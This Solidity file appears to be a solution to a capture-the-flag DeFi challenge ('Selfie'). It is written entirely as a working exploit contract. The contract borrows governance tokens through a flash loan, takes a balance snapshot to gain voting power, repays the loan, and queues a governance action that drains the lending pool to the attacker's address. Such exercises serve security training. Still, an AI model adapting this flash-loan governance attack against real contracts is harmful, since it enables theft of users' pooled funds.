// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowingAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;

    function transfer(address reciepient, uint256 amount) external;
}

contract SelfieAttacker {
    using Address for address payable;

    ISelfiePool pool;
    ISimpleGovernance governance;

    uint256 public actionId;

    constructor(address _pool, address _governance) public {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
    }

    function receiveTokens(IDamnValuableTokenSnapshot token, uint256 amount)
        external
    {
        token.snapshot();
        token.transfer(msg.sender, amount);
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
